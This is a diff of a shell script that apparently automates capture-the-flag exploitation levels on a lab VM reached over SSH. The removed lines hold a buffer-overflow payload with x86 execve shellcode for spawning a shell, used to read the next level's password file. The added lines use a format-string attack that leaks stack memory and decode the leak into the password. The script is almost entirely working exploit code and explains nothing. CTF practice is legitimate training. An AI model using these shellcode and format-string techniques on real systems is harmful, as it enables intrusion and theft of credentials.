@@ -28,16 +28,34 @@ if [ ! -f "../level0${PREVIOUS_LEVEL}/flag" ]; then
 fi
 
 act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")
+if [ -z ${act_level_password} ]; then
+    echo "not correct ssh password"
+    exit 1
+fi
 
-sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'python -c "print \"dat_wil\" + \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\" + \"\n\" + \"a\"*64 + \"b\"*16 + \"\x47\xa0\x04\x08\"" > /tmp/level01_overflow; echo "cat /home/users/level02/.pass" > /tmp/level01_cmd' 2> /dev/null
+hex_flag=""
+hex_flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "%22\$lX %23\$lX %24\$lX %25\$lX %26\$lX" | ./level02' 2> /dev/null | grep '^[0-9A-F]\{16\}')
 
+hex_flag=$(echo "${hex_flag}" | sed 's/\(\([0-9A-F]\{16\} \)*\).*/\1/g')
 flag=""
-cnt=0
-while [ -z "${flag}" ] && [ "${cnt}" -lt 40 ]
-do
-    flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/level01_overflow /tmp/level01_cmd | ./level01' 2> /dev/null | grep --max-count=1 '^[a-zA-Z0-9]\{40\}$' | head --line=1)
 
-    let cnt++
+part_number=1
+while [ $part_number -le 5 ]
+do
+    part=$(echo "${hex_flag}" | awk '{ print $'"${part_number}"' }')
+    part=$(echo "${part}" | sed 's/[0-9A-F][0-9A-F]/& /g')
+
+    cnt=8
+    while [ $cnt -gt 0 ]
+    do
+        char=$(echo "${part}" | awk '{ print $'"${cnt}"' }')
+        char=$(echo -n -e "\x${char}")
+        flag="${flag}${char}"
+
+        let cnt--
+    done
+
+    let part_number++
 done
 
 echo -e "FLAG:\n${flag}"
